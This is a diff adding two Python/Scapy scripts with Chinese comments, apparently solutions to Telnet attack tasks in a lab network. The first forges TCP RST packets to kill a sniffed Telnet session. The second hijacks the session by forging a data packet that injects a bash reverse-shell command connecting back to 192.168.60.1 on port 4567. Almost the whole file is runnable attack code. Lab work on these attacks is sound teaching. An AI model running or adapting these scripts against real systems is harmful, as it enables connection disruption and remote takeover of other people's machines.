@@ -1,0 +1,88 @@
+任务2
+#!/usr/bin/python3
+from scapy.all import *
+
+SRC = "192.168.60.2"  # hostA的IP
+DST = "192.168.60.3"  # hostM的IP
+PORT = 23
+
+def spoof(pkt):
+    old_tcp = pkt[TCP]
+    old_ip = pkt[IP]
+    
+    #############################################
+    ip = IP(src = old_ip.dst,  # 反向发送
+            dst = old_ip.src)
+    
+    tcp = TCP(sport = old_tcp.dport,
+              dport = old_tcp.sport, 
+              seq = old_tcp.ack,      # 使用ACK号作为序列号
+              flags = "R")
+    #############################################
+    
+    pkt = ip/tcp
+    send(pkt, verbose=0)
+    print("Spoofed Packet: {} --> {}".format(ip.src, ip.dst))
+
+f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
+print("[*] Starting TCP RST Auto-Attack...")
+print("[*] Target: {} -> {}:{}".format(SRC, DST, PORT))
+print("[*] Using interface: br-fd74f556480b")
+print("[*] Press Ctrl+C to stop")
+
+# 关键修改：使用正确的Docker网桥接口
+sniff(iface="br-fd74f556480b", filter=f, prn=spoof)
+
+
+任务3
+
+#!/usr/bin/python3
+from scapy.all import *
+
+SRC = "192.168.60.2"  # hostA
+DST = "192.168.60.3"  # hostM  
+PORT = 23
+ATTACKER_IP = "192.168.60.1"
+
+def spoof_session(pkt):
+    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
+        return False
+        
+    old_ip = pkt[IP]
+    old_tcp = pkt[TCP]
+    
+    # 只处理服务器到客户端的包
+    if old_ip.src == DST and old_ip.dst == SRC and old_tcp.sport == PORT:
+        print(f"[*] 监控: Seq={old_tcp.seq}, Ack={old_tcp.ack}")
+        
+        # 当用户输入命令后服务器响应时攻击
+        if old_tcp.flags == 'PA' and len(old_tcp.payload) > 20:
+            print("[+] 检测到命令输出，执行会话劫持...")
+            
+            # 构造劫持包
+            ip = IP(src=SRC, dst=DST)
+            tcp = TCP(
+                sport=old_tcp.dport,
+                dport=PORT,
+                seq=old_tcp.ack,  # 关键：使用ACK作为SEQ
+                ack=old_tcp.seq + len(old_tcp.payload),
+                flags="PA"
+            )
+            
+            # 反向shell命令
+            cmd = " /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.60.1/4567 0>&1'\n"
+            
+            pkt = ip/tcp/cmd
+            send(pkt, verbose=0)
+            print("[+] 反向shell命令注入完成!")
+            
+            return True
+    
+    return False
+
+print("=== TCP会话劫持攻击 ===")
+print("等待用户输入命令...")
+sniff(iface="br-fd74f556480b",
+      filter=f'tcp and host {SRC} and host {DST} and port {PORT}',
+      prn=spoof_session,
+      stop_filter=lambda x: spoof_session(x))
